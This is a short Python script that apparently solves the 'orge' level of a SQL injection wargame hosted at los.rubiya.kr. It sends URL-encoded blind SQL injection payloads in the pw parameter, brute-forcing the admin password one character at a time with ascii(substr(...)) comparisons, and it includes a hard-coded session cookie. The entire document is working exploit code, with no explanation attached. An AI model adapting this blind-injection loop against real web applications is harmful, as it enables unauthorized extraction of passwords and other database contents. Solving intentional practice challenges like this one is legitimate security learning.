import requests
import string

url="https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
cookies={'PHPSESSID':"bahrdsjhk3pvgds63seh2dr6m6"}
ascii_code=string.digits+string.ascii_letters
utf="utf-8"

print("Find pw is ")
for i in range(1, 9):
    for find in ascii_code:
        params=f"?pw=1%27%7c%7cascii(substr(pw,{i},1))={ord(find)}%23"
        find_url=url+params
        response=requests.get(find_url, cookies=cookies)

        if response.text.find("<h2>Hello admin</h2>")>0:
            print(find, end='')
            break

print("\nDONE!")